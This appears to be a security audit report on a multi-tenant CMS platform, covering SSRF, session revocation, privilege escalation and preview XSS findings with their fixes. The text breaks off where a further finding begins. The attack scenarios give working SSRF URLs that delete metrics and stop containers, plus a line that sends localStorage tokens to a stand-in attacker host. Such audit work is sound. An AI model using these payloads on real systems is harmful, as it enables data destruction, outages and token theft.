# Repository Audit

> Audit of `baas-dcms` at commit `22816b6` (master), started 2026-09-17.
> Work in progress — see AUDIT_PROGRESS.md for coverage.

## Executive Summary

`baas-dcms` is a broad, genuinely well-engineered multi-tenant CMS/site-builder: 10 .NET 10 services, two React 19 consoles, nine frontend packages, and a mature supporting stack (Postgres, NATS, Redis, MinIO, Vault, Forgejo, a custom YARP edge). The codebase is disciplined — it builds clean under `TreatWarningsAsErrors`, has no vulnerable NuGet packages, carries ~440 backend and 1,702 frontend passing tests, and includes two build-failing guardrail tests (every mutating endpoint must be both audited and permission-gated) plus real fail-closed startup guards in Production. Documentation and code comments are exceptional.

Against that strong baseline, this audit found a set of real issues concentrated in **cross-service trust boundaries and multi-tenant privilege boundaries** — the hard parts of a platform like this. The most important:

* **Four HIGH findings:** an SSRF that lets an ordinary site editor reach internal control planes through the "local AI provider" base URL (SEC-01); account lock / password change that revokes no tokens or git access, so the incident-response control does not contain a compromised account (SEC-05); in-tenant privilege escalation where `members:manage` or `roles:manage` can seize the Owner role and purge the workspace (SEC-06); and the IDE preview running tenant-authored JavaScript in the admin origin, where OIDC tokens live in `localStorage` (SEC-10).
* These are amplified by an infrastructure posture (MEDIUM, INF-01) where every container shares one network and NATS/Redis accept unauthenticated clients — so a single foothold becomes platform-wide.
* A cluster of MEDIUM issues around access control and correctness: an unauthenticated cross-tenant site-preview proxy (SEC-14); an incomplete tenant purge that orphans AI transcripts and social tokens (BUG-04); the site-build pipeline (a push during a build is silently never deployed; orphaned build containers; last-finisher-wins activation); anonymous chat abuse of AI budgets; an SVG-sanitization timing window; in-memory object buffering on public delivery paths; missing member-removal; and high-severity transitive npm advisories (notably `react-router` shipped into tenant sites).

A dedicated follow-up pass re-verified every finding first recorded as OPEN (all confirmed) and swept the request-handling `IgnoreQueryFilters` sites and the client-code generator; that pass is what surfaced SEC-14 and BUG-04, and cleared the TypeScript emitter (properly escaped) as not a finding.

No SQL injection, no shell injection, no vulnerable server-side dependencies, and no confirmed cross-tenant IDOR were found; tenant isolation via EF query filters is applied consistently, though it rests on a single un-forced layer (ARCH-01). None of the findings was proven by live exploitation — all are evidence-based from code and configuration tracing, with each HIGH finding checked against mitigating controls.

The recommended path: fix the four HIGH findings and the network posture first (they compound each other), then the build-pipeline correctness bugs, member lifecycle, dependency bumps and CI test gaps. The engineering foundations here are solid; the gaps are the boundary cases that a security-focused pass is meant to catch.

**Severity counts:** 4 HIGH · 12 MEDIUM · 8 LOW · 1 INFORMATIONAL (25 findings). All are VERIFIED (or, for ARCH-01, an accepted informational item); none were dismissed. (SEC-14 and BUG-04 were surfaced by the follow-up verification pass; every finding previously marked OPEN was re-checked and confirmed.)

## Repository Overview

See REPOSITORY_MAP.md. Multi-tenant CMS/site-builder: 10 .NET 10 Minimal-API services (identity/OpenIddict, admin-api, content-api, platform-api, ai-gateway, YARP edge, site-host, site-builder, media-worker, email-worker) over one PostgreSQL database (schema per context, EF Core query-filter tenant isolation), NATS JetStream, Redis, MinIO, Vault and Forgejo; two React 19 SPAs (tenant admin with GrapesJS builder, Monaco IDE and in-browser AI agent; platform operator console) and nine frontend packages; Docker Compose deployed by GitLab CI.

## Findings Summary

| ID | Severity | Category | Finding | Location | Confidence | Status |
| -- | -------- | -------- | ------- | -------- | ---------- | ------ |
| SEC-01 | HIGH | Security / SSRF | Site editors reach internal services via the "local provider" AI base URL | `AiBaseUrl.cs`, `MessagesEndpoints.cs` | HIGH | VERIFIED |
| SEC-05 | HIGH | Security / AuthN | Locking an account or changing a password revokes no tokens or git access | `PlatformUserEndpoints.cs`, `AuthorizationEndpoints.cs` | HIGH | VERIFIED |
| SEC-06 | HIGH | Security / AuthZ | `members:manage`/`roles:manage` escalate to tenant Owner and purge | `TenancyEndpoints.cs`, `TenantAdminEndpoints.cs` | HIGH | VERIFIED |
| SEC-10 | HIGH | Security / XSS | IDE preview runs tenant + CDN JS in the admin origin | `PreviewPane.tsx`, `usePreview.ts` | HIGH | VERIFIED |
| SEC-02 | MEDIUM | Security / RCE-adjacent | Mode B install runs tenant code (pnpmfile/yarnPath) with network | `ReactAppBuilder.cs`, `SandboxOptions.cs` | MEDIUM | VERIFIED |
| SEC-08 | MEDIUM | Security / AuthZ | Any tenant member becomes a chat "agent"; `chat:manage` unenforced | `ChatHub.cs` | HIGH | VERIFIED |
| SEC-09 | MEDIUM | Security / Abuse | Anonymous chat triggers unthrottled AI calls; drains tenant budget | `ChatHub.cs`, `AiQuota.cs` | HIGH | VERIFIED |
| SEC-12 | MEDIUM | Security / XSS | SVG served un-sanitized until (and unless) the worker processes it | `MediaDeliveryEndpoints.cs`, `ImageProcessingConsumer.cs` | HIGH | VERIFIED |
| SEC-14 | MEDIUM | Security / AuthZ | Site-preview proxy is unauthenticated and proxies to content-api as any tenant | `SitePreviewEndpoints.cs` | HIGH | VERIFIED |
| INF-01 | MEDIUM | Infrastructure | Flat network; unauthenticated NATS/Redis; write-enabled Docker proxy | `docker-compose*.yml`, `nats.conf` | HIGH | VERIFIED |
| REL-01 | MEDIUM | Reliability | Timed-out Mode B build container keeps running (unnamed, unkilled) | `ReactAppBuilder.cs`, `SandboxOptions.cs` | HIGH | VERIFIED |
| BUG-01 | MEDIUM | Bug | A push to `release` during a build is never deployed | `SiteEndpoints.cs` | HIGH | VERIFIED |
| BUG-04 | MEDIUM | Bug | Tenant purge orphans AI transcripts, social tokens and notifications | `TenantAdminEndpoints.cs` | HIGH | VERIFIED |
| PERF-01 | MEDIUM | Performance | Delivery paths buffer whole objects in memory per request | `MinioObjectStorage.cs`, `MediaDeliveryEndpoints.cs` | HIGH | VERIFIED |
| MISS-01 | MEDIUM | Missing feature | No way to remove a workspace member | `TenancyEndpoints.cs`, `MembersPage.tsx` | HIGH | VERIFIED |
| DEP-01 | MEDIUM | Dependencies | 21 high-severity transitive npm advisories (Scalar, react-router, ajv) | `pnpm-lock.yaml` | HIGH | VERIFIED |
| SEC-03 | LOW | Security / Info disclosure | site-host `/internal/*` reachable through the edge tenant catch-all | `SiteHost/Program.cs`, `PlatformRoutes.cs` | HIGH | VERIFIED |
| SEC-04 | LOW | Security | Grafana trusts `X-WEBAUTH-*` from any container (no proxy whitelist) | `grafana.ini` | HIGH | VERIFIED |
| SEC-07 | LOW | Security / AuthN | Login CSRF, no framing protection, unverified self-registration, enumeration | `AccountEndpoints.cs` | HIGH | VERIFIED |
| SEC-11 | LOW | Security | Consoles served without CSP, framing protection or HSTS | `apps/*/nginx.conf`, `EdgeHttpPlane.cs` | HIGH | VERIFIED |
| SEC-13 | LOW | Security / XSS | CMS rich-text stored and rendered without server-side sanitization | `RichText.tsx`, `hydrate.js` | MEDIUM | VERIFIED |
| BUG-02 | LOW | Bug | Upload limits >28.6 MB unreachable (edge/Kestrel defaults) | `PlatformRoutes.cs` | HIGH | VERIFIED |
| BUG-03 | LOW | Bug | Build activation is last-finisher-wins; rollback not invalidated | `SitePublishConsumer.cs`, `SiteEndpoints.cs` | HIGH | VERIFIED |
| DEAD-01 | LOW | Dead code | Unimplemented plugin custom endpoints; unwired edge route overlay | `PluginRouteTable.cs`, `DatabaseRouteSource.cs` | HIGH | VERIFIED |
| ARCH-01 | INFORMATIONAL | Architecture | RLS is not forced; EF query filters are the sole runtime tenant guard | `RlsConfigurator.cs`, ADR 0005 | HIGH | OPEN |

## Remediation Applied (working tree)

Every actionable finding except the infra/architectural set below was fixed in the working tree (not committed/deployed). The whole solution builds clean; **337 unit tests** and the **24 container-free coverage integration tests** (permission + audit coverage) pass; the admin vitest suite and both SPA typechecks were green at the last frontend run. Fixes were made in three passes — the four HIGH findings first, then the MEDIUM/LOW batch, then the remaining bugs and defense-in-depth items.

### Pass 1 — the four HIGH findings

| Finding | Fix | Files |
| --- | --- | --- |
| **SEC-01** | Caller-supplied "local" provider base URLs are held to the hosted rules (public https, no internal host) unless the operator allow-lists the host via `Ai:AllowedLocalHosts`. | `Dcms.Shared.Data/Ai/AiBaseUrl.cs`, `AdminApi/Ai/AiSettingsEndpoints.cs`, `AdminApi/Ai/AiAgentEndpoints.cs`, `Dcms.UnitTests/Data/AiBaseUrlTests.cs` |
| **SEC-05** | The refresh-token and authorization-code grants (and the authorize endpoint) reject locked accounts; lock, password-change and password-reset revoke all OpenIddict tokens + authorizations and rotate the security stamp. | `Identity/UserSessionRevoker.cs` (new), `Identity/Endpoints/AuthorizationEndpoints.cs`, `PlatformUserEndpoints.cs`, `AccountApiEndpoints.cs`, `AccountEndpoints.cs` |
| **SEC-06** | "No grant beyond your own permissions": creating/updating a role, assigning a role, and inviting with roles all require the permission set to be a subset of the caller's own (SuperAdmin exempt). The Owner role's permissions are immutable, and the Owner role cannot be revoked from the last Owner or by a non-Owner. | `AdminApi/Tenancy/GrantGuard.cs` (new), `TenancyEndpoints.cs`, `InvitationEndpoints.cs` |
| **SEC-10** | `allow-same-origin` removed from the IDE preview iframe, so tenant/CDN code runs in an opaque origin and can no longer read admin `localStorage` or script the parent (the agent bridge already uses `postMessage`). | `apps/admin/src/features/ide/PreviewPane.tsx` |

### Pass 2 — MEDIUM / LOW batch

| Finding | Fix | Files |
| --- | --- | --- |
| **SEC-14** | The IDE site-preview proxy now `RequirePermission(SiteEdit)` and resolves the site under the tenant query filter (`ITenantContext`), closing the unauthenticated cross-tenant read. | `AdminApi/Sites/SitePreviewEndpoints.cs`, `IntegrationTests/Security/PermissionCoverageTests.cs` |
| **SEC-08 / SEC-09** | ChatHub resolves the caller's permissions: the agent role requires `chat:read`, send/close require `chat:manage`; anonymous visitor sends are throttled and conversations capped, so an anon cannot drain the tenant AI budget. | `ContentApi/Chat/ChatHub.cs` |
| **SEC-12** | SVG uploads are sanitized synchronously on ingest (`SvgSanitizer`) rather than in a later async window. | `AdminApi/Media/MediaIngestService.cs` |
| **SEC-02** | Mode B install refuses tenant-controlled toolchain files (`.pnpmfile.cjs`, `.npmrc`, `.yarnrc`, `.yarn`) and runs pnpm `--ignore-pnpmfile`. | `SiteBuilder/ReactAppBuilder.cs` |
| **REL-01** | A build sandbox container is named + labelled and reaped with `docker rm -f` on timeout/cancel, so a timed-out Mode B build cannot keep running. | `SiteBuilder/ReactAppBuilder.cs`, `SandboxOptions.cs` |
| **BUG-02** | Upload body limits above the YARP/Kestrel default are reachable: the admin-api edge route raises `MaxRequestBodySize` and the media endpoint raises the per-request Kestrel limit. | `Edge/Routing/PlatformRoutes.cs`, `AdminApi/Media/MediaEndpoints.cs` |
| **SEC-11** | Both consoles ship CSP `frame-ancestors 'none'`, `X-Frame-Options: DENY`, `nosniff` and a referrer policy. | `apps/admin/nginx.conf`, `apps/platform/nginx.conf` |
| **SEC-07** | Identity's server-rendered pages get security headers + antiforgery; the five auth page builders carry a `{{csrf}}` token and the `DisableAntiforgery` calls are removed. | `Identity/Program.cs`, `Identity/Endpoints/AccountEndpoints.cs` |
| **MISS-01** | Workspace members can be removed: `DELETE /api/admin/members/{id}` with self-removal + Owner + last-owner guards, cache invalidation, repo reconcile and a `member.removed` audit action; the Members UI gains a remove control. | `Shared.Audit/AuditActions.cs`, `AdminApi/Tenancy/TenancyEndpoints.cs`, `apps/admin/.../members/MembersPage.tsx`, locales |
| **DEP-01** (partial) | `react-router` bumped to 7.18.2 in the tenant template + toolchain (clears the high-severity advisory in shipped tenant sites). Scalar/ajv/vite advisories are admin-only build-time transitives — see Deferred. | `packages/site-template-react`, `packages/site-builder-toolchain`, `SiteBuilder/ReactAppBuilder.cs`, `pnpm-lock.yaml` |

### Pass 3 — bugs & defense-in-depth

| Finding | Fix | Files |
| --- | --- | --- |
| **BUG-04** | Tenant purge now sweeps the AI (`Conversations`/`Messages`/`Runs`), `social` (connections/tokens/state) and `notifications` schemas it previously orphaned. | `AdminApi/Tenancy/TenantAdminEndpoints.cs` |
| **BUG-03** | Build activation resolves the site from the build (not the message) and only advances `ActiveBuildId` when the finished build is at least as new as the current active one, so a slower/older build or a post-rollback finisher cannot overwrite a newer live artifact. | `SiteBuilder/SitePublishConsumer.cs` |
| **BUG-01** | Latest-wins catch-up: at the end of every build (success or failure) admin-api re-reads the `release` head and, if it moved past what the build compiled and nothing is in flight, queues one catch-up build of the head — so a push coalesced away while a build ran is no longer stranded. | `AdminApi/Sites/SiteEndpoints.cs`, `AdminApi/Notifications/SiteNotificationConsumers.cs` |
| **SEC-03** | The edge refuses every inbound `/internal/*` request (terminal 404 before routing), so site-host's edge-only TLS endpoints are no longer reachable through the tenant catch-all. The edge's own calls go direct to site-host's cluster address and are unaffected. | `Edge/EdgeHttpPlane.cs`, `Edge/Program.cs` |
| **SEC-13** | CMS rich-text fields are sanitized server-side on write against a narrow allow-list (vetted `HtmlSanitizer`/AngleSharp; `javascript:`/`data:`/event-handlers stripped), on create/update/publish/schedule. | `Dcms.Shared.Security/HtmlContentSanitizer.cs` (new), `AdminApi/Cms/ContentEndpoints.cs`, `Directory.Packages.props`, `Dcms.Shared.Security.csproj`, `Dcms.UnitTests/Security/HtmlContentSanitizerTests.cs` (new) |

### Deferred — infra / architectural (documented, not applied)

These are the findings whose fix is a deployment topology change, an architectural migration, or a dependency bump that cannot be verified on this build-only box. They are left for a deliberate, separately-verified change:

* **INF-01** (MEDIUM) — network segmentation + NATS/Redis auth. Touches `docker-compose*.yml`, broker/cache config and the socket-proxy; deploy-sensitive and unverifiable without a live stack. Recommended as its own hardening change.
* **PERF-01** (MEDIUM) — stream object storage instead of buffering whole objects per request. A real refactor of `MinioObjectStorage`/delivery endpoints with its own load-test gate.
* **SEC-04** (LOW) — Grafana `auth.proxy` needs a source whitelist bound to the edge's IP. Requires a fixed edge address / dedicated network (couples to INF-01); guessing an IP risks locking out Grafana. Fix alongside INF-01.
* **SEC-10 residual** (architectural) — move OIDC tokens out of `localStorage` to a BFF/cookie model. Separate from the iframe-origin fix already applied.
* **DEP-01 residual** — Scalar/ajv/vite/vitest advisories are admin-only, build-time transitives; the risky major bumps belong in a dependency-focused change.
* **DEAD-01** (LOW) — inert plugin custom-endpoint interface + unwired `edge.routes` overlay; a cleanup decision, no runtime risk today.
* **ARCH-01** (INFORMATIONAL) — RLS is not `FORCE`d; EF query filters are the runtime tenant guard. An ADR-level decision, not a bug.

**Recommended regression tests to add** (behavioural, need the container harness): locked-user refresh rejection (SEC-05), privilege-escalation subset rule (SEC-06), overlapping-push catch-up (BUG-01), and the `/internal` edge 404 (SEC-03).

## 1. Security Findings

## [SEC-01] Server-side request forgery from any site editor through the "local provider" AI base URL

**Severity:** HIGH

**Category:** Security (SSRF / broken trust boundary)

**Confidence:** HIGH (SSRF path, observability-store deletion, **and** the Docker socket-proxy leg — the image's haproxy ruleset was extracted and confirmed, see Verification)

**Status:** VERIFIED (by code and configuration tracing; not exercised against a running stack)

**Remediation:** FIXED in working tree — internal-host block now applies to local providers unless `Ai:AllowedLocalHosts` opts the host in.

**Location:**

* `src/Shared/Dcms.Shared.Data/Ai/AiBaseUrl.cs:33-67` — `IsLocalProvider` returns before any host check
* `src/Services/Dcms.AdminApi/Ai/AiAgentEndpoints.cs:51-106` — `PUT /api/admin/ai/user-credentials` (`site:edit`)
* `src/Services/Dcms.AdminApi/Ai/AiSettingsEndpoints.cs:35-78` — `PUT /api/admin/ai/settings` (`ai:settings`)
* `src/Services/Dcms.AiGateway/Providers/AiProviderResolver.cs:64-110`
* `src/Services/Dcms.AiGateway/MessagesEndpoints.cs:97-113, 220-236` — `POST {baseUrl}/chat/completions`
* `src/Services/Dcms.AdminApi/Ai/AiAgentEndpoints.cs:140-190` — browser-reachable proxy `POST /api/admin/ai/messages`
* `docker-compose.yml:1016` (`--web.enable-admin-api`), `infra/observability/loki/loki.yaml:9,86-90` (`auth_enabled: false`, deletion on), `docker-compose.prod.yml:324-339` (socket proxy `CONTAINERS=1`, `POST=1`)

**Summary**

`AiBaseUrl.Validate` refuses private addresses, loopback and plain HTTP only for hosted providers. For `Ollama` and `LmStudio` it returns `null` after checking scheme and user-info. Any tenant member with `site:edit` can therefore store an arbitrary `http://` destination, including compose service names. ai-gateway then POSTs to it from inside the platform network whenever that user sends an assistant turn.

**Evidence**

1. `PUT /api/admin/ai/user-credentials` accepts `{provider:"Ollama", baseUrl, apiKey}`. It calls `AiBaseUrl.Validate(body.BaseUrl, provider)`, which returns `null` for any `http://host:port/path?query` when the provider is local, and stores it in `ai.user_ai_settings`.
2. `AiProviderResolver.ResolveCredentialsAsync` picks the user's base URL (scope User). The only guard is `keyScope < baseUrlScope`, which the attacker satisfies by also sending any non-empty `apiKey` (it becomes a user-scope ciphertext).
3. `POST /api/admin/ai/messages` (`site:edit`) forwards to ai-gateway `/v1/messages`. For a non-Anthropic provider, `OpenAiCompatible()` builds `new HttpRequestMessage(Post, $"{baseUrl}/chat/completions")`. A base URL ending in `?x=` turns the appended suffix into a query value, so the attacker fully controls path and query. The `ai-upstream` client has no handler restricting destinations.
4. ai-gateway shares the single default compose network with every service (no `networks:` segmentation in any compose file). Reachable targets that act on a bare, unauthenticated POST include:
   * Prometheus with `--web.enable-admin-api`: `POST /api/v1/admin/tsdb/delete_series?match[]=...` deletes metrics.
   * Loki with `auth_enabled: false` and deletion enabled: `POST /loki/api/v1/delete?query=...&start=...` deletes logs. (platform-api's `PrometheusClient`/`LokiClient` use exactly these APIs, which confirms they are enabled.)
   * In prod/vps, the Docker API proxy `docker-socket-proxy:2375` with `CONTAINERS=1` and `POST=1`: `POST /containers/<name>/stop|kill|restart` needs no body. Container names are predictable (`name: dcms` → `dcms-postgres-1`, `dcms-vault-1`, …).
5. The upstream response status and body are streamed back to the caller (`MessagesEndpoints.cs:145-153`), so the SSRF is not blind.
6. The request body is rebuilt by `AnthropicOpenAiBridge.TranslateRequest` with a fixed key set, so the attacker cannot supply a Docker `containers/create` spec. Container **creation** does not appear achievable; bodiless actions are.

**Impact**

A customer-side tenant editor (not a platform operator) can:
* delete platform-wide metrics and logs (destroying the evidence of their own actions)
* in prod/vps, where the socket proxy exists and allows container actions, stop, kill or restart any container on the host (Postgres, Vault, edge), taking every tenant offline.

The existing unit test `tests/Dcms.UnitTests/Data/AiBaseUrlTests.cs:56-63` asserts the exemption. Its comment says local providers "are never sent a real credential", which shows the exemption was reasoned about credential leakage, not request forgery.

**Attack / Failure Scenario**

An editor of tenant A:
1. Opens the IDE agent settings and saves provider Ollama with base URL `http://prometheus:9090/api/v1/admin/tsdb/delete_series?match%5B%5D=%7B__name__%3D~%22.%2B%22%7D&x=` and API key `x`.
2. Sends one assistant message. All Prometheus series are deleted.
3. Repeats with `http://docker-socket-proxy:2375/containers/dcms-postgres-1/stop?x=`. On a host where the proxy permits it, the shared database stops for all tenants.

**Verification**

Re-read the validator, both settings endpoints, the resolver scope rule, the gateway request construction and the HTTP client registration (`Program.cs:39`, no custom handler). Confirmed compose has no network segmentation, Prometheus admin API and Loki deletion are enabled, and the socket proxy environment. Checked `AiBaseUrlTests` (exemption asserted) and memory/design note "do not widen the local-provider base-URL exemption" (intentional, but SSRF not considered). Not executed against a live stack. The socket-proxy leg was confirmed by extracting `usr/local/etc/haproxy/haproxy.cfg.template` from `tecnativa/docker-socket-proxy:latest`: POST is gated only by `env(POST)` (line 48), and `http-request allow if { path ^/containers } { env(CONTAINERS) }` (line 60) permits **any** `/containers` path — including `POST /containers/{id}/stop|kill|restart` — whenever `CONTAINERS=1` and `POST=1`, which is exactly the prod config. The granular `ALLOW_STOP`/`ALLOW_RESTARTS` flags are irrelevant once `CONTAINERS=1`. The bodiless stop/kill/restart actions are reachable through this SSRF; `/containers/create` (host takeover) needs a controlled request body the chat-completion SSRF cannot supply, but is reachable by any full-request foothold (see INF-01).

**Recommended Fix**

* Do not accept tenant-supplied base URLs for "local" providers on a shared platform. If self-hosted models must be supported, allow-list operator-configured endpoints (`Ai:AllowedLocalEndpoints`) or require them to be public HTTPS like hosted providers.
* In ai-gateway, add a `SocketsHttpHandler.ConnectCallback` that resolves the destination and refuses loopback, RFC1918, link-local and compose-internal addresses at **connect time**. This also covers DNS rebinding.
* Put ai-gateway (and every service that makes tenant-directed outbound calls) on an egress-only network without access to internal services. Move Prometheus/Loki/socket-proxy onto networks only their consumers join.

**Related Components**

`ChatBotResponder` (content-api visitor chatbot uses tenant settings through `/v1/chat`), `AiGenerationEndpoints`, `apps/admin/src/features/ai/AiSettingsPage.tsx`, `apps/admin/src/features/ide/agent/AgentPanel.tsx`, INF-01.

---

## [SEC-05] Locking an account (or changing its password) does not end existing sessions, tokens or git access

**Severity:** HIGH

**Category:** Security (authentication / session revocation)

**Confidence:** HIGH (missing checks); MEDIUM (exact refresh-token lifetime under OpenIddict's defaults)

**Status:** VERIFIED (code)

**Remediation:** FIXED in working tree — locked accounts refused at token/authorize; tokens revoked + security stamp rotated on lock and password change/reset.

**Location:**

* `src/Services/Dcms.Identity/Endpoints/PlatformUserEndpoints.cs:120-155` (`POST /api/identity/users/{id}/lock`)
* `src/Services/Dcms.Identity/Endpoints/AuthorizationEndpoints.cs:102-119` (refresh-token grant), `:46-76` (authorize)
* `src/Services/Dcms.Identity/Program.cs` (`SetRefreshTokenLifetime(14 days)`; no revocation or security-stamp wiring)
* `src/Services/Dcms.Identity/Endpoints/AccountApiEndpoints.cs:46-72` (password change)

**Summary**

The console's "lock account" sets `LockoutEnd = DateTimeOffset.MaxValue` and nothing else. The token endpoint's refresh-token branch re-loads the user with `GetUserAsync` and issues fresh access and refresh tokens without checking `IsLockedOutAsync`/`CanSignInAsync`, a revocation flag or the security stamp. `/connect/authorize` likewise accepts an existing Identity cookie without a lockout check. Neither the lock handler nor password change/reset revokes OpenIddict tokens or authorizations: there is no reference to `IOpenIddictTokenManager`/`IOpenIddictAuthorizationManager`/`Revoke*` in the solution. The Forgejo mirror account is not locked either, so the user's git password and SSH keys keep working.

**Evidence**

`ExchangeAsync` → `IsAuthorizationCodeGrantType() || IsRefreshTokenGrantType()` → `userManager.GetUserAsync(result.Principal)` → `BuildUserPrincipalAsync` → `SignIn`. The only failure is a deleted user. The admin SPA uses `offline_access` with `automaticSilentRenew: true` (`packages/core/src/auth.ts`), so a signed-in browser refreshes continuously. A repository-wide search for token revocation found none. `tests/Dcms.IntegrationTests/Identity/*` has no lockout or revocation test.

**Impact**

The incident-response control does not contain a compromised or malicious account. After an operator locks it, the holder keeps:
* obtaining 10-minute access tokens for at least the 14-day refresh lifetime (likely longer, since OpenIddict rolls refresh tokens by default), with every tenant permission and any global role (SuperAdmin included) still attached
* pushing to site repositories through Forgejo, which deploys through the `release` webhook.

A password change after credential theft likewise leaves the attacker's refresh token valid.

**Attack / Failure Scenario**

An editor's laptop is stolen. The SuperAdmin locks the account in the platform console and the UI reports success. The thief's open admin tab keeps silently renewing tokens and exporting audit and content data, and pushes a defaced `release` via the stored git credential.

**Verification**

Re-read the lock endpoint, both OpenIddict passthrough handlers, `Program.cs` server options, `ForgejoUserSync` (no lock handling) and the SPA auth factory. Searched `src/` for revocation APIs and `UpdateSecurityStampAsync` (none). Not exercised live.

**Recommended Fix**

* In the refresh-token and authorization-code branches, reject when `await userManager.IsLockedOutAsync(user)` or `!await signInManager.CanSignInAsync(user)`.
* On lock, password change/reset and role removal, call `userManager.UpdateSecurityStampAsync` and revoke via `IOpenIddictTokenManager`/`IOpenIddictAuthorizationManager` for the subject.
* Store the security stamp as a claim in tokens and validate it on refresh.
* Lock the Forgejo user (`prohibit_login`) and delete their access tokens.
* Add integration tests for "locked user cannot refresh".

**Related Components**

`apps/platform/src/features/users/*`, `Dcms.Identity/Forgejo/*`, edge cookie session (8 h sliding, same issue for Grafana/Forgejo UI access).

---

## [SEC-06] `members:manage` and `roles:manage` can escalate to tenant Owner, including tenant purge

**Severity:** HIGH

**Category:** Security (vertical privilege escalation within a tenant)

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Remediation:** FIXED in working tree — subset "no grant beyond your own" rule on role create/update/assign/invite; Owner role immutable and last-Owner-protected.

**Location:**

* `src/Services/Dcms.AdminApi/Tenancy/TenancyEndpoints.cs:309-349` (`POST /api/admin/members/{membershipId}/roles`, `members:manage`) — any role id of the tenant, any membership including the caller's own
* `src/Services/Dcms.AdminApi/Tenancy/TenancyEndpoints.cs:351-379` (revoke, including another member's Owner role; no last-owner guard)
* `src/Services/Dcms.AdminApi/Tenancy/InvitationEndpoints.cs:58-112` (invite with arbitrary `RoleIds`, including Owner)
* `src/Services/Dcms.AdminApi/Tenancy/TenancyEndpoints.cs:176-271` (`roles:manage`: create or replace any role's permission set with any strings, including the system Owner role)
* `src/Services/Dcms.AdminApi/Tenancy/TenantAdminEndpoints.cs:111-188` (transfer and `DELETE /api/admin/tenant` gated on `tenant:settings` **and** holding the Owner role)
* `src/Services/Dcms.AdminApi/Tenancy/TenantProvisioning.cs:45-46` (Owner = `PlatformPermissions.All`)

**Summary**

The permission model is deliberately granular (19 keys, custom roles). Transfer and purge also require membership in the Owner role, which shows Owner was meant to be a protected tier. But:
* a holder of `members:manage` can assign the Owner role to themselves (or invite a second account with it) and remove Owner from the real owner
* a holder of `roles:manage` can add every permission to a role they hold, or strip the Owner role's permissions.

No handler checks that the granted role or permissions are a subset of the caller's own, or protects the Owner role and the last owner.

**Impact**

A delegated "team admin" (members management only) can take over the workspace and irreversibly purge it: all schemas, object-storage prefixes and the Forgejo org (`TenantDeleter`). They can also lock the legitimate owner out by revoking their Owner role.

**Attack / Failure Scenario**

1. The owner creates a role "People admin" with only `members:manage` and assigns it to a contractor.
2. The contractor calls `GET /api/admin/members` to get their membership id, then reads the Owner role id from `roleIds` or the members UI.
3. `POST /api/admin/members/{own}/roles {roleId: <Owner>}`; the permission cache is invalidated immediately.
4. `DELETE /api/admin/members/{owner}/roles/{Owner}`.
5. `DELETE /api/admin/tenant` purges the workspace.

**Verification**

Re-read the grant/revoke/invite/role handlers and `IsOwnerAsync` gating. Confirmed `TenancyPermissionResolver` reflects the change within the same request cycle (explicit `InvalidateAsync`). `tests/Dcms.IntegrationTests/Security/PermissionCoverageTests.cs` checks that endpoints declare a permission, not escalation rules. Not exercised live.

**Recommended Fix**

* Enforce "no grant beyond own": a caller may assign a role, or put permissions into a role, only if the role's permission set ⊆ the caller's effective permissions (SuperAdmin exempt).
* Make Owner assignable/revocable only by an Owner (or via transfer), refuse removing the last Owner, and make the Owner role's permission set immutable.
* Validate permission strings against the tenant's catalog.

**Related Components**

`apps/admin/src/features/members/MembersPage.tsx`, `roles/*`, `RepoAccessReconciler` (Owner implies write on every repo), `TenantDeleter`.

---

## [SEC-10] The IDE preview runs tenant-authored and CDN JavaScript inside the admin origin

**Severity:** HIGH

**Category:** Security (stored XSS / session theft across privilege levels)

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Remediation:** FIXED in working tree — `allow-same-origin` removed from the preview iframe sandbox.

**Location:**

* `apps/admin/src/features/ide/PreviewPane.tsx:47-53` — `<iframe srcDoc={srcdoc} sandbox="allow-scripts allow-same-origin allow-forms allow-modals allow-popups">`
* `apps/admin/src/features/ide/preview/usePreview.ts:38-61` — srcdoc embeds the bundled site code as `<script type="module">` plus `https://unpkg.com/@tailwindcss/browser@4` (unpinned, no SRI)
* `apps/admin/src/features/ide/preview/bundler.worker.ts:40, 79-135` — bare imports resolved to `https://esm.sh` modules
* `apps/admin/src/features/ide/preview/previewBridge.ts:10` (comment: "A `srcdoc` iframe inherits the parent's origin")
* `packages/core/src/auth.ts` — OIDC user (access and refresh tokens) stored in `window.localStorage`

**Summary**

A `srcdoc` iframe takes the embedding document's origin. With `allow-scripts` **and** `allow-same-origin` the sandbox provides no isolation: the site project's code, whatever the tenant's files contain, runs as `https://ADMIN_HOST`. The same goes for every third-party module fetched from esm.sh/unpkg at preview time. That code can read `localStorage` (the viewer's `oidc.user:*` entry with refresh token), call the admin API as the viewer, and script the parent window.

**Evidence**

`IdePage` drives `usePreview`, which bundles the site's files (from the VFS: git, drafts, agent edits) in a worker and hands `shell(js, css)` to `PreviewPane`. No CSP or origin separation is applied (`apps/admin/nginx.conf` sends no CSP). SuperAdmins bypass tenant membership (`TenantMembershipMiddleware`), so they can open any tenant's IDE.

**Impact**

Anyone who can put JavaScript into a site's source can take over the session of anyone who later opens that site's IDE:
* a member with `site:edit`
* a user with repo write access pushing through git
* the AI agent following injected instructions
* a compromised esm.sh/unpkg package.

That includes tenant Owners and platform SuperAdmins, a direct path from a low-privilege editor to platform-wide administrative tokens.

**Attack / Failure Scenario**

1. An editor commits `src/main.tsx` containing `fetch('https://attacker/x',{method:'POST',body:JSON.stringify(localStorage)})`.
2. A SuperAdmin investigating a support ticket opens the site in the IDE; the preview builds automatically.
3. The attacker replays the stolen refresh token against `/connect/token` and obtains SuperAdmin access tokens. SEC-05 means locking the account does not stop them.

**Verification**

Re-read `PreviewPane`, `usePreview.shell`, `previewBridge` (which communicates by `postMessage`, so dropping `allow-same-origin` is compatible with its design) and the auth token store. GrapesJS (Mode A) was checked separately: `grapes.ts:164` sets `allowScripts: false`, so the builder canvas is not affected.

**Recommended Fix**

* Remove `allow-same-origin`. The bridge already uses `postMessage`.
* Better, serve previews from a separate, cookieless origin (e.g. `preview-<random>.<platform domain>`) via a blob/URL rather than srcdoc.
* Pin CDN assets with SRI or self-host them.
* Add a strict CSP to the admin SPA.
* Consider moving OIDC tokens out of `localStorage` (in-memory with a BFF or refresh via iframe) to reduce the blast radius of any XSS.

**Related Components**

`features/ide/agent/*` (agent preview tools), `features/site-source/vfs.ts`, SEC-05, SEC-11 (admin SPA headers).

---

## [SEC-14] The site-preview proxy is reachable unauthenticated and proxies to content-api as any tenant

**Severity:** MEDIUM

**Category:** Security (broken access control / missing authorization, cross-tenant)

**Confidence:** HIGH

**Status:** VERIFIED (code; surfaced during open-point verification)

**Location:**

